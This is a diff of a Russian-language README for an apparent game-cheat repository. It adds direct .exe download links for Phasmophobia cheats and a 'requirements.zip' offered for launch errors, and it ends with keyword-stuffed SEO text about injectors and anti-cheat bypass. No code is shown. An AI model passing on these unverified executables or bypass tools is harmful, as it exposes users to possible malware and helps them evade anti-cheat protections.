@@ -8,7 +8,7 @@
 
 |    Игры     |   Дата последнего обновления  |
 |:-----------:|:--------------:|
-| [Rust](https://github.com/spacecollapse/Rust)                     | /*Обновлено 11.08.2024*\  |
+| [Rust](https://github.com/spacecollapse/cheats#rust)                     | /*Обновлено 11.08.2024*\  |
 | [Garry's Mod](https://github.com/spacecollapse/cheats#garrys-mod) |  /*Обновлено 29.07.2024*\ |
 | [Genshin Impact](https://github.com/spacecollapse/Genshin-Impact) | /*Обновлено 30.10.2024*\  |
 | [Osu](https://github.com/spacecollapse/osu-)                      | /*Обновлено 15.05.2024*\  |
@@ -105,6 +105,20 @@ Vlone 2564 - https://yougame.biz/threads/330039
 
 Скачать - https://github.com/spacecollapse/cheats/releases/download/cheats/RMacros.exe
 
+
+## - - - - - - - - - - - - 
+
+## - - - - - - - - - - - - 
+
+## - - - - - - - - - - - - 
+
+## - - - - - - - - - - - - 
+
+## - - - - - - - - - - - - 
+
+## - - - - - - - - - - - - 
+
+
 ## Garry's mod
 
 ### FriendlyHack
@@ -116,5 +130,51 @@ Vlone 2564 - https://yougame.biz/threads/330039
 
 ![image](https://github.com/user-attachments/assets/f6f11c40-20ba-4410-bd4e-9c433e921ab7)
 
+## - - - - - - - - - - - - 
 
+## - - - - - - - - - - - - 
+
+## - - - - - - - - - - - - 
+
+## - - - - - - - - - - - - 
+
+## - - - - - - - - - - - - 
+
+## - - - - - - - - - - - - 
+
+## Phasmophobia
+
+### Project Rencify (ENZO)
+
+![image](https://github.com/user-attachments/assets/e4e4fd0e-c492-40af-9052-f5bd36d9b6f7)
+
+Скачать - https://github.com/spacecollapse/cheats/releases/download/cheats/enzo.exe
+
+- ОШИБКА ПРИ ЗАПУСКЕ? 
+* качайте это - https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/sdk-5.0.408-windows-x64-installer
+* и это - https://github.com/spacecollapse/cheats/releases/download/ex/requirements.zip
+
+Чтобы запустить нажимаем 1 и ентер если фазмофобия НЕ запущена
+
+![{69B748D4-5475-433B-BB01-DA60B9F55BB5}](https://github.com/user-attachments/assets/08a1fafa-0992-4eb6-8bc8-1b3f9b6c5144)
+
+
+### PhasmoMenu
+
+![{2E290EA9-A9DA-467E-9DCB-DDD875BA3158}](https://github.com/user-attachments/assets/cd6cd44a-4f5c-4228-8bbb-140db63533cc)
+
+Скачать - https://github.com/spacecollapse/cheats/releases/download/cheats/PhasmoMenu.v0.5.4.5.By.PappyG_.unknowncheats.me._.exe
+
+
+## - - - - - - - - - - - - 
+
+## - - - - - - - - - - - - 
+
+## - - - - - - - - - - - - 
+
+## - - - - - - - - - - - - 
+
+## - - - - - - - - - - - - 
+
+## - - - - - - - - - - - - 
 чит, читы, чит на раст, раст алкад, usehvh, читы на игры, bypass, пак после сноса винды, injector, инжектор, чит на пиратский раст, чит на гарисмод, гарисмод читы, shellshock чит, фазмафобия читы, читы на фазму, чит на осу, осу читы, амонгас чит, тимфортрес чит, шелшок чит, чит на шелчок, обход, 
